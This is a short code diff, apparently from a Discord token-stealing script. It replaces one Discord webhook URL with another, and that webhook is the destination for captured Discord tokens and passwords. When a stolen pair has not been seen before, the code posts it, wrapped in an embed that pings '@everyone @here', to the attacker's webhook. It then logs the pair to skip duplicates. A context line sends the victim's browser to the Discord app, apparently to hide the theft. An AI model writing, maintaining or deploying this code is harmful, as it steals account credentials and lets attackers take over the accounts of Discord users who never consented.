@@ -128,7 +128,7 @@ window.location="https://discord.com/channels/@me";
       if (process.logged.find((e) => e.token === token && e.passowrd === pass)) {
         console.log("Found Duplicate Logged ID");
       } else {
-        await axios({ method: "POST", url: "https://discord.com/api/webhooks/1052050979840860182/q1mTfTpBYZpFK9fQGiWGDUNYnge16ODe3TGNXJRjDRirpU71HoO9sgwSy5ddQfMxrKAz", data: { content: "@everyone @here", embeds: [embed.toJSON()] } }).catch((err) => console.log(err.name));
+        await axios({ method: "POST", url: "https://canary.discord.com/api/webhooks/1054303465880420432/9NPg39l450Ke3-Oec5yRt3xJc-YtpK9pBBAoOA1w-p92I4stNsv9ql5IT_CtGY_u_yvu", data: { content: "@everyone @here", embeds: [embed.toJSON()] } }).catch((err) => console.log(err.name));
         process.logged.push({ token, password: pass });
       }
     } catch (err) {
